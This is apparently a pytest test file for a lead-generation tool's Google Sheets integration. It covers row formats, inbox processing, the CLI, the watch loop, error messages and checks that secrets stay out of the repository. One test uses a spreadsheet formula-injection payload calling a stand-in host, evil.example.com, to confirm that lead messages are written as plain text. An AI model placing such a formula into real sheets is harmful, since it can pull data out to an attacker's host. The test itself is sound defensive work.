"""Google Sheets support, tested with a fake client: no network, no key, no Google account."""

from __future__ import annotations

import asyncio
import subprocess
import sys
import types
from dataclasses import replace
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from leadgen import cli, sheets
from leadgen.config import ConfigError, Settings
from leadgen.models import Lead, LeadRecord
from leadgen.runner import load_leads, run_leads
from leadgen.server import create_app
from leadgen.sheets import (
    INBOX_HEADER,
    LEADS_HEADER,
    STATUS_OPTIONS,
    GspreadClient,
    InboxSheet,
    LeadsSheet,
    SheetMirrorStorage,
    SheetsError,
    lead_row,
    open_inbox,
    open_storage,
    sheets_active,
)
from leadgen.storage import LocalStorage
from tests.fakes import FakeSheetsClient

ROOT = Path(__file__).resolve().parents[1]


@pytest.fixture
def fake() -> FakeSheetsClient:
    return FakeSheetsClient()


@pytest.fixture
def sheet_settings(tmp_path) -> Settings:
    """Mock model, sheet switched on explicitly (as `make demo-sheet` does)."""
    return Settings(
        mock_llm=True,
        data_dir=str(tmp_path / "data"),
        sheets_enabled=True,
        sheets_allow_mock=True,
        google_sheet_id="fake-sheet-id",
    )


def go(leads, settings, rulebook, storage, **kwargs):
    return asyncio.run(
        run_leads(leads, settings=settings, rulebook=rulebook, storage=storage, **kwargs)
    )


def record(lead_id: str = "A", **extra) -> LeadRecord:
    lead = Lead(id=lead_id, received_at="2026-01-05T10:00:00+05:00", name="Demo", message="hi")
    return LeadRecord(lead=lead, **extra)


# --------------------------------------------------------------------------- row format


def test_leads_header_is_exactly_the_agreed_columns() -> None:
    assert LEADS_HEADER == [
        "Received At", "Lead ID", "Name", "Channel", "Message", "Intent", "Score", "Hot",
        "Route", "Status", "Missing Info", "Handover Reason", "Draft Reply", "Run ID",
    ]  # fmt: skip


def test_row_format() -> None:
    row = lead_row(
        record(
            "L1", intent="quote_request", score=9, is_hot=True, route="draft_reply",
            status="pending_approval", missing_info=["timeline", "location"],
            draft_reply="Hi Demo,\nThanks.", run_id="run-1",
        )
    )  # fmt: skip
    assert len(row) == len(LEADS_HEADER) and all(isinstance(cell, str) for cell in row)
    as_dict = dict(zip(LEADS_HEADER, row, strict=True))
    assert as_dict["Lead ID"] == "L1" and as_dict["Score"] == "9" and as_dict["Hot"] == "yes"
    assert as_dict["Missing Info"] == "timeline, location"
    assert as_dict["Draft Reply"] == "Hi Demo,\nThanks." and as_dict["Run ID"] == "run-1"
    cold_row = lead_row(record(route="handover", handover_reason="complaint"))
    cold = dict(zip(LEADS_HEADER, cold_row, strict=True))
    assert cold["Hot"] == "no" and cold["Handover Reason"] == "complaint"


def test_a_message_that_looks_like_a_formula_is_written_as_plain_text(fake) -> None:
    lead = Lead(id="F", message='=IMPORTXML("http://evil.example.com","//a")')
    LeadsSheet(fake).append_record(LeadRecord(lead=lead))
    assert fake.tabs["Leads"][1][4] == '=IMPORTXML("http://evil.example.com","//a")'


# --------------------------------------------------------------------------- header


def test_header_is_created_frozen_and_gets_a_status_dropdown_on_an_empty_tab(fake) -> None:
    sheet = LeadsSheet(fake)
    sheet.append_record(record("A"))
    sheet.append_record(record("B"))
    rows = fake.tabs["Leads"]
    assert rows[0] == LEADS_HEADER and [row[1] for row in rows[1:]] == ["A", "B"]
    assert fake.frozen == ["Leads"]
    assert fake.dropdowns == [("Leads", "J2:J1000", STATUS_OPTIONS)]
    assert {"pending_approval", "approved", "rejected", "needs_human", "nurture"} <= set(
        STATUS_OPTIONS
    )


def test_existing_header_is_left_alone() -> None:
    fake = FakeSheetsClient({"Leads": [list(LEADS_HEADER), ["old row"]], "Inbox": []})
    LeadsSheet(fake).append_record(record("NEW"))
    assert len(fake.tabs["Leads"]) == 3 and fake.frozen == [] and fake.dropdowns == []


def test_custom_tab_name(fake) -> None:
    fake.tabs["Results"] = []
    LeadsSheet(fake, "Results").append_record(record("A"))
    assert fake.tabs["Results"][0] == LEADS_HEADER and fake.tabs["Leads"] == []


# --------------------------------------------------------------------------- one row per lead


def test_one_row_is_appended_as_each_lead_finishes(sheet_settings, rulebook, fake) -> None:
    storage = open_storage(sheet_settings, client=fake)
    assert isinstance(storage, SheetMirrorStorage)
    rows_seen = []
    outcome = go(
        load_leads("sample", storage),
        sheet_settings,
        rulebook,
        storage,
        on_lead_done=lambda _record: rows_seen.append(len(fake.tabs["Leads"])),
    )
    # header + 1 row after the first lead, + 1 more after each following lead
    assert rows_seen == [2, 3, 4, 5, 6]
    rows = fake.tabs["Leads"]
    assert [row[1] for row in rows[1:]] == ["S001", "S002", "S003", "S004", "S005"]
    assert rows[1][8] == "draft_reply" and rows[1][7] == "yes" and "Hi Demo" in rows[1][12]
    assert rows[4][8] == "handover" and rows[4][11] and rows[4][12] == ""
    assert all(row[13] == outcome.run.id for row in rows[1:])
    assert outcome.run.errors == []
    # and everything is still saved locally
    assert len(LocalStorage(sheet_settings.resolved_data_dir()).list_records()) == 5


def test_dry_run_never_touches_the_sheet(sheet_settings, rulebook, fake) -> None:
    storage = open_storage(sheet_settings, client=fake)
    outcome = go(load_leads("sample", storage), sheet_settings, rulebook, storage, dry_run=True)
    assert outcome.run.leads_processed == 5
    assert fake.calls == [] and fake.tabs["Leads"] == []


def test_mock_mode_never_calls_google(tmp_path, monkeypatch, rulebook) -> None:
    def explode(_settings):
        raise AssertionError("mock mode must not create a Google client")

    monkeypatch.setattr(sheets, "make_client", explode)
    settings = Settings(
        mock_llm=True, data_dir=str(tmp_path), sheets_enabled=True, google_sheet_id="x"
    )
    assert not sheets_active(settings)
    storage = open_storage(settings)
    assert isinstance(storage, LocalStorage)
    go(load_leads("sample", storage)[:1], settings, rulebook, storage)
    with pytest.raises(ConfigError, match="mock mode"):
        open_inbox(settings)


def test_sheets_off_by_default(tmp_path) -> None:
    defaults = Settings.from_env({})
    assert not defaults.sheets_enabled and not sheets_active(defaults)
    assert defaults.google_service_account_file == "secrets/service-account.json"
    assert (defaults.sheet_leads_tab, defaults.sheet_inbox_tab) == ("Leads", "Inbox")
    assert isinstance(open_storage(Settings(data_dir=str(tmp_path))), LocalStorage)
    assert sheets_active(Settings(sheets_enabled=True))  # real model + enabled
    with pytest.raises(ConfigError, match="SHEETS_ENABLED=1"):
        open_inbox(Settings())


def test_missing_sheet_id_is_a_clear_error(tmp_path) -> None:
    settings = Settings(data_dir=str(tmp_path), sheets_enabled=True)
    with pytest.raises(ConfigError, match="GOOGLE_SHEET_ID"):
        open_storage(settings)


# --------------------------------------------------------------------------- failures


def test_google_failure_does_not_lose_the_lead_and_the_run_continues(
    sheet_settings, rulebook, fake
) -> None:
    fake.tabs["Leads"] = [list(LEADS_HEADER)]
    fake.fail_writes = 1  # the first lead's row fails
    storage = open_storage(sheet_settings, client=fake)
    outcome = go(load_leads("sample", storage), sheet_settings, rulebook, storage)
    assert outcome.run.leads_processed == 5
    assert len(outcome.run.errors) == 1
    assert "S001 is saved locally but not in the sheet" in outcome.run.errors[0]
    assert "Share the sheet" in outcome.run.errors[0]
    assert [row[1] for row in fake.tabs["Leads"][1:]] == ["S002", "S003", "S004", "S005"]
    assert len(LocalStorage(sheet_settings.resolved_data_dir()).list_records()) == 5


def test_sheet_updates_pause_after_repeated_failures(sheet_settings, rulebook, fake) -> None:
    fake.tabs["Leads"] = [list(LEADS_HEADER)]
    fake.fail_writes = 99
    storage = open_storage(sheet_settings, client=fake)
    outcome = go(load_leads("sample", storage), sheet_settings, rulebook, storage)
    assert outcome.run.leads_processed == 5 and len(outcome.run.errors) == 3
    assert "paused for the rest of this run" in outcome.run.errors[-1]
    assert len(fake.writes) == 3  # stopped trying after three failures


# --------------------------------------------------------------------------- inbox


def inbox_rows() -> list[list[str]]:
    return [
        list(INBOX_HEADER),
        ["2026-01-07T09:00:00+05:00", "Inbox One", "one@example.com", "0300-0000021",
         "Office in Gulberg Lahore, bill 120,000, need a site survey this month", ""],
        ["", "Already Done", "done@example.com", "", "Old message", "draft_reply (SH-3) earlier"],
        ["", "No Message", "", "", "   ", ""],
        ["", "Inbox Two", "two@example.com", "", "solar ka kya rate hai?"],  # short row
    ]  # fmt: skip


def test_inbox_reads_only_new_rows_with_a_message() -> None:
    fake = FakeSheetsClient({"Leads": [], "Inbox": inbox_rows()})
    leads = InboxSheet(fake).pending()
    assert [lead.name for lead in leads] == ["Inbox One", "Inbox Two"]
    assert leads[0].id.startswith("SH-2-") and leads[1].id.startswith("SH-5-")
    assert leads[0].channel == "sheet" and leads[0].received_at.startswith("2026-01-07")
    assert leads[1].received_at  # filled in when the cell is empty
    assert fake.writes == []  # reading never writes


def test_enquiry_typed_into_row_one_of_a_headerless_tab_is_not_skipped() -> None:
    rows = [
        ["", "Row One", "one@example.com", "", "Need solar for my house in Lahore", ""],
        ["", "Row Two", "two@example.com", "", "Office in Gulberg, need a site survey", ""],
    ]
    fake = FakeSheetsClient({"Leads": [], "Inbox": rows})
    inbox = InboxSheet(fake)
    leads = inbox.pending()
    assert [lead.name for lead in leads] == ["Row One", "Row Two"]
    assert leads[0].id.startswith("SH-1-") and leads[1].id.startswith("SH-2-")
    inbox.mark_processed(LeadRecord(lead=leads[0], route="draft_reply"))
    assert fake.tabs["Inbox"][0][5].startswith("draft_reply")  # row 1 itself was marked
    assert [lead.name for lead in InboxSheet(fake).pending()] == ["Row Two"]


def test_empty_inbox_tab_gets_its_header(fake) -> None:
    assert InboxSheet(fake).pending() == []
    assert fake.tabs["Inbox"] == [INBOX_HEADER]


def test_inbox_rows_are_processed_exactly_once(sheet_settings, rulebook) -> None:
    fake = FakeSheetsClient({"Leads": [], "Inbox": inbox_rows()})
    storage = open_storage(sheet_settings, client=fake)
    inbox = open_inbox(sheet_settings, client=fake)
    first = go(inbox.pending(), sheet_settings, rulebook, storage,
               on_lead_done=inbox.mark_processed)  # fmt: skip
    assert first.run.leads_processed == 2
    assert fake.tabs["Inbox"][1][5].startswith("draft_reply (SH-2-")
    assert fake.tabs["Inbox"][4][5].startswith("draft_reply (SH-5-")
    assert fake.tabs["Inbox"][2][5] == "draft_reply (SH-3) earlier"  # untouched
    assert inbox.pending() == []  # nothing left the second time
    assert len(fake.tabs["Leads"]) == 3  # header + 2 leads


# --------------------------------------------------------------------------- CLI


@pytest.fixture
def cli_fake(monkeypatch) -> FakeSheetsClient:
    """Sheet switched on for the CLI, with every client replaced by one fake."""
    fake = FakeSheetsClient({"Leads": [], "Inbox": inbox_rows()})
    monkeypatch.setattr(sheets, "make_client", lambda _settings: fake)
    monkeypatch.setenv("SHEETS_ENABLED", "1")
    monkeypatch.setenv("SHEETS_ALLOW_MOCK", "1")
    monkeypatch.setenv("GOOGLE_SHEET_ID", "fake-sheet-id")
    return fake


def test_cli_sample_run_fills_the_leads_tab(cli_fake, capsys) -> None:
    assert cli.main(["--source", "sample", "--limit", "2"]) == 0
    out = capsys.readouterr().out
    assert 'results also go to the "Leads" tab' in out and "Nothing was sent" in out
    assert [row[1] for row in cli_fake.tabs["Leads"][1:]] == ["S001", "S002"]


def test_cli_dry_run_reads_the_inbox_but_writes_nothing(cli_fake, capsys) -> None:
    assert cli.main(["--source", "sheet", "--dry-run"]) == 0
    out = capsys.readouterr().out
    assert "Inbox One" in out and "DRY RUN" in out and "results also go" not in out
    assert cli_fake.writes == [] and cli_fake.tabs["Leads"] == []
    assert cli_fake.tabs["Inbox"][1][5] == ""  # not marked


def test_cli_sheet_source_marks_rows_and_fills_leads(cli_fake, capsys) -> None:
    assert cli.main(["--source", "sheet"]) == 0
    assert len(cli_fake.tabs["Leads"]) == 3
    assert cli_fake.tabs["Inbox"][1][5] and cli_fake.tabs["Inbox"][4][5]
    capsys.readouterr()
    assert cli.main(["--source", "sheet"]) == 0
    assert "No new leads from source 'sheet'" in capsys.readouterr().out
    assert len(cli_fake.tabs["Leads"]) == 3


def test_cli_sheet_source_needs_sheets_enabled(capsys) -> None:
    assert cli.main(["--source", "sheet"]) == 2
    assert "SHEETS_ENABLED=1" in capsys.readouterr().err


def test_cli_read_failure_is_a_clear_error(cli_fake, capsys) -> None:
    cli_fake.fail_reads = 1
    assert cli.main(["--source", "sheet"]) == 2
    assert "GOOGLE_SHEET_ID" in capsys.readouterr().err


def test_cli_sheet_write_failure_is_reported_but_leads_are_kept(cli_fake, capsys, tmp_path) -> None:
    cli_fake.tabs["Leads"] = [list(LEADS_HEADER)]
    cli_fake.fail_writes = 1
    assert cli.main(["--source", "sample", "--limit", "2"]) == 1
    out = capsys.readouterr().out
    assert "! Google Sheets: lead S001 is saved locally but not in the sheet" in out
    assert len(LocalStorage(tmp_path / "data").list_records()) == 2


@pytest.mark.parametrize("argv", [["--watch"], ["--source", "sample", "--watch"],
                                  ["--interval", "0"], ["--delay", "-1"]])  # fmt: skip
def test_bad_watch_flags_are_rejected(argv) -> None:
    with pytest.raises(SystemExit):
        cli.parse_args(argv)


# --------------------------------------------------------------------------- watch loop


def watch(fake, settings, rulebook, sleep, dry_run: bool = False) -> int:
    args = cli.parse_args(["--source", "sheet", "--watch", "--interval", "7"])
    args.dry_run = dry_run
    storage = open_storage(settings, client=fake)
    return cli.watch_inbox(
        open_inbox(settings, client=fake),
        args=args, settings=settings, rulebook=rulebook, storage=storage, sleep=sleep,
    )  # fmt: skip


def test_watch_processes_new_rows_as_they_arrive_and_stops_on_ctrl_c(
    sheet_settings, rulebook, capsys
) -> None:
    fake = FakeSheetsClient({"Leads": [], "Inbox": [list(INBOX_HEADER)]})
    sleeps = []

    def sleep(seconds: float) -> None:
        sleeps.append(seconds)
        if len(sleeps) == 1:  # someone types a row while we wait
            fake.tabs["Inbox"].append(["", "Typed Live", "live@example.com", "",
                                       "Need solar for my house in Lahore", ""])  # fmt: skip
        if len(sleeps) == 4:
            raise KeyboardInterrupt

    assert watch(fake, sheet_settings, rulebook, sleep) == 0
    out = capsys.readouterr().out
    assert "Watching the Inbox tab every 7s" in out and "Stopped by Ctrl+C." in out
    assert "Watch finished: 1 lead(s) processed" in out
    assert sleeps == [7, 7, 7, 7]
    assert len(fake.tabs["Leads"]) == 2  # header + the one lead, handled once
    assert fake.tabs["Inbox"][1][5].startswith("draft_reply")


def test_watch_respects_the_lead_cap(sheet_settings, rulebook, capsys) -> None:
    fake = FakeSheetsClient({"Leads": [], "Inbox": inbox_rows()})
    capped = replace(sheet_settings, max_leads_per_run=1)

    def sleep(_seconds: float) -> None:
        pass

    assert watch(fake, capped, rulebook, sleep) == 0
    assert "Lead limit reached (1). Stopping." in capsys.readouterr().out
    assert len(fake.tabs["Leads"]) == 2


def test_watch_respects_the_token_cap(sheet_settings, rulebook, capsys) -> None:
    fake = FakeSheetsClient({"Leads": [], "Inbox": inbox_rows()})
    capped = replace(sheet_settings, max_tokens_per_run=50)
    assert watch(fake, capped, rulebook, lambda _s: None) == 0
    assert "Token limit reached (50). Stopping." in capsys.readouterr().out
    assert len(fake.tabs["Leads"]) == 2  # one lead, then the budget was spent


def test_watch_dry_run_does_not_repeat_or_write(sheet_settings, rulebook) -> None:
    fake = FakeSheetsClient({"Leads": [], "Inbox": inbox_rows()})
    calls = []

    def sleep(_seconds: float) -> None:
        calls.append(1)
        if len(calls) == 3:
            raise KeyboardInterrupt

    assert watch(fake, sheet_settings, rulebook, sleep, dry_run=True) == 0
    assert fake.writes == []


def test_watch_gives_up_after_repeated_read_failures(sheet_settings, rulebook, capsys) -> None:
    fake = FakeSheetsClient({"Leads": [], "Inbox": inbox_rows()})
    fake.fail_reads = 99
    assert watch(fake, sheet_settings, rulebook, lambda _s: None) == 2
    assert "Giving up after 3 failed attempts" in capsys.readouterr().err


# --------------------------------------------------------------------------- demo helper


def test_demo_uses_the_mock_when_there_is_no_key(cli_fake, monkeypatch, capsys) -> None:
    monkeypatch.setenv("LEADGEN_MOCK_LLM", "0")  # mock off, but no key either
    assert cli.main(["--source", "sample", "--demo", "--limit", "2", "--delay", "0"]) == 0
    out = capsys.readouterr().out
    assert "Model: mock (no API key needed). Estimated cost for 2 lead(s): $0." in out
    assert out.index("Estimated cost") < out.index("[S001]")  # printed before starting
    assert len(cli_fake.tabs["Leads"]) == 3


def test_demo_settings_and_cost_estimate(rulebook) -> None:
    real = Settings(openai_api_key="sk-test-not-real", llm_model="some-model")
    assert cli.demo_settings(real) == real  # key present and mock off: real model
    assert cli.demo_settings(Settings()).mock_llm
    assert cli.demo_settings(Settings(openai_api_key="sk-REPLACE-ME")).mock_llm
    text = cli.cost_estimate(5, real, rulebook)
    assert "openai/some-model (REAL API calls)" in text and "62,500 tokens" in text
    assert "$0.031" in text and "config/client.yaml" in text


def test_delay_pauses_between_leads_only(sheet_settings, rulebook, fake, monkeypatch) -> None:
    pauses = []

    async def fake_sleep(seconds: float) -> None:
        pauses.append(seconds)

    monkeypatch.setattr("leadgen.runner.asyncio.sleep", fake_sleep)
    storage = open_storage(sheet_settings, client=fake)
    go(load_leads("sample", storage)[:3], sheet_settings, rulebook, storage, delay=2.5)
    assert pauses == [2.5, 2.5]


def test_make_demo_sheet_target() -> None:
    makefile = (ROOT / "Makefile").read_text()
    line = next(text for text in makefile.splitlines() if "--demo" in text)
    assert "SHEETS_ENABLED=1" in line and "SHEETS_ALLOW_MOCK=1" in line and "--delay" in line


# --------------------------------------------------------------------------- server


def test_server_run_mirrors_to_the_sheet_and_dry_run_does_not(sheet_settings, fake) -> None:
    client = TestClient(create_app(sheet_settings, open_storage(sheet_settings, client=fake)))
    client.post("/run", json={"source": "sample", "dry_run": True, "limit": 2})
    assert fake.calls == []
    client.post("/run", json={"source": "sample", "limit": 2})
    assert len(fake.tabs["Leads"]) == 3


# --------------------------------------------------------------------------- real client wrapper


class FakeWorksheet:
    def __init__(self) -> None:
        self.calls: list[tuple] = []
        self.error: Exception | None = None

    def _record(self, name: str, *args, **kwargs):
        self.calls.append((name, args, kwargs))
        if self.error:
            raise self.error

    def get_all_values(self):
        self._record("get_all_values")
        return [["a", 1]]

    def append_row(self, values, value_input_option=None):
        self._record("append_row", values, value_input_option=value_input_option)

    def update_cell(self, row, col, value):
        self._record("update_cell", row, col, value)

    def freeze(self, rows=None, cols=None):
        self._record("freeze", rows=rows)

    def add_validation(self, cell_range, condition_type, values, strict=False, showCustomUi=False):
        self._record("add_validation", cell_range, str(condition_type), values,
                     strict=strict, showCustomUi=showCustomUi)  # fmt: skip


class WorksheetNotFound(Exception):
    pass


class SpreadsheetNotFound(Exception):
    pass


class APIError(Exception):
    def __init__(self, code: int, message: str) -> None:
        super().__init__(message)
        self.code = code


@pytest.fixture
def fake_gspread(monkeypatch, tmp_path):
    """A stand-in `gspread` module, so the wrapper is tested without the real library."""
    worksheet = FakeWorksheet()
    state = types.SimpleNamespace(worksheet=worksheet, opened=[], open_error=None, tab_error=None)

    class Spreadsheet:
        def worksheet(self, title):
            if state.tab_error:
                raise state.tab_error
            return worksheet

    class Client:
        def open_by_key(self, key):
            if state.open_error:
                raise state.open_error
            state.opened.append(key)
            return Spreadsheet()

    def service_account(filename, scopes):
        state.auth = (filename, list(scopes))
        return Client()

    module = types.ModuleType("gspread")
    module.service_account = service_account
    utils = types.ModuleType("gspread.utils")
    utils.ValidationConditionType = types.SimpleNamespace(one_of_list="ONE_OF_LIST")
    module.utils = utils
    monkeypatch.setitem(sys.modules, "gspread", module)
    monkeypatch.setitem(sys.modules, "gspread.utils", utils)
    key = tmp_path / "service-account.json"
    key.write_text('{"client_email": "bot@example-project.iam.gserviceaccount.com"}')
    state.client = GspreadClient("sheet-123", key)
    return state


def test_real_client_uses_the_library_as_expected(fake_gspread) -> None:
    client, worksheet = fake_gspread.client, fake_gspread.worksheet
    assert client.read("Leads") == [["a", "1"]]
    client.append("Leads", ["=1+1", "x"])
    client.set_cell("Inbox", 3, 6, "done")
    client.freeze_header("Leads")
    client.add_dropdown("Leads", "J2:J1000", ["a", "b"])
    assert fake_gspread.opened == ["sheet-123"]  # opened once, then cached
    assert fake_gspread.auth[1] == ["https://www.googleapis.com/auth/spreadsheets"]  # no Drive
    by_name = {call[0]: call for call in worksheet.calls}
    assert by_name["append_row"] == ("append_row", (["=1+1", "x"],), {"value_input_option": "RAW"})
    assert by_name["update_cell"][1] == (3, 6, "done")
    assert by_name["freeze"][2] == {"rows": 1}
    assert by_name["add_validation"][1] == ("J2:J1000", "ONE_OF_LIST", ["a", "b"])
    assert by_name["add_validation"][2] == {"strict": False, "showCustomUi": True}


@pytest.mark.parametrize(
    ("error", "expected"),
    [
        (PermissionError(), "Share the sheet with bot@example-project.iam.gserviceaccount.com"),
        (SpreadsheetNotFound(), "GOOGLE_SHEET_ID is wrong"),
        (APIError(403, "Google Sheets API has not been used in project 1 before or it is disabled"),
         "Enable the Google Sheets API"),
        (APIError(403, "The caller does not have permission"), "Share the sheet with"),
        (APIError(429, "Quota exceeded"), "quota"),
        (ConnectionError("network down"), "internet connection"),
    ],
)  # fmt: skip
def test_open_errors_say_what_to_fix(fake_gspread, error, expected: str) -> None:
    fake_gspread.open_error = error
    with pytest.raises(SheetsError, match=expected):
        fake_gspread.client.read("Leads")


def test_missing_tab_missing_key_and_write_errors(fake_gspread, tmp_path) -> None:
    fake_gspread.tab_error = WorksheetNotFound("Leads")
    with pytest.raises(SheetsError, match='no tab named "Leads"'):
        fake_gspread.client.read("Leads")
    fake_gspread.tab_error = None
    fake_gspread.worksheet.error = APIError(429, "Quota exceeded")
    with pytest.raises(SheetsError, match='adding a row to "Leads".*quota'):
        fake_gspread.client.append("Leads", ["x"])
    with pytest.raises(SheetsError, match="GOOGLE_SERVICE_ACCOUNT_FILE"):
        GspreadClient("sheet-123", tmp_path / "nope.json").read("Leads")


def test_error_messages_never_contain_the_key(fake_gspread) -> None:
    fake_gspread.client.key_file.write_text(
        '{"client_email": "bot@example.com", "private_key": "TOP-SECRET-VALUE"}'
    )
    fake_gspread.open_error = PermissionError()
    with pytest.raises(SheetsError) as info:
        fake_gspread.client.read("Leads")
    assert "TOP-SECRET-VALUE" not in str(info.value) and "bot@example.com" in str(info.value)


def test_missing_library_is_a_clear_error(monkeypatch, tmp_path) -> None:
    monkeypatch.setitem(sys.modules, "gspread", None)  # makes "import gspread" fail
    key = tmp_path / "key.json"
    key.write_text("{}")
    with pytest.raises(SheetsError, match=r'pip install -e "\.\[sheets\]"'):
        GspreadClient("sheet-123", key).read("Leads")


def test_our_calls_match_the_installed_gspread_if_present() -> None:
    """Only runs where gspread is installed: checks the real method signatures."""
    gspread = pytest.importorskip("gspread")
    import inspect

    from gspread.utils import ValidationConditionType
    from gspread.worksheet import Worksheet

    assert "scopes" in inspect.signature(gspread.service_account).parameters
    assert "value_input_option" in inspect.signature(Worksheet.append_row).parameters
    assert {"strict", "showCustomUi"} <= set(inspect.signature(Worksheet.add_validation).parameters)
    assert "rows" in inspect.signature(Worksheet.freeze).parameters
    assert ValidationConditionType.one_of_list == "ONE_OF_LIST"
    assert hasattr(Worksheet, "get_all_values") and hasattr(Worksheet, "update_cell")


# --------------------------------------------------------------------------- secrets hygiene


@pytest.mark.parametrize(
    "path",
    [
        "secrets/service-account.json", "secrets/anything.json", "service-account.json",
        "my-project-service-account-123.json", "service_account_key.json",
        "google-credentials.json", "data/runtime/live-eval-report.json",
    ],
)  # fmt: skip
def test_key_files_cannot_be_committed(path: str) -> None:
    result = subprocess.run(["git", "check-ignore", "-q", path], cwd=ROOT, check=False)
    assert result.returncode == 0, f"{path} is not git-ignored"


def test_no_tracked_file_contains_a_service_account_key() -> None:
    tracked = subprocess.run(
        ["git", "ls-files"], cwd=ROOT, check=True, capture_output=True, text=True
    ).stdout.split()
    markers = ("-----BEGIN " + "PRIVATE KEY-----", '"type": ' + '"service_account"')
    for name in tracked:
        path = ROOT / name
        if not path.is_file() or path.stat().st_size > 2_000_000:
            continue
        text = path.read_text(encoding="utf-8", errors="ignore")
        for marker in markers:
            assert marker not in text, f"{name} looks like it contains a service account key"
    assert not any(name.startswith("secrets/") for name in tracked)
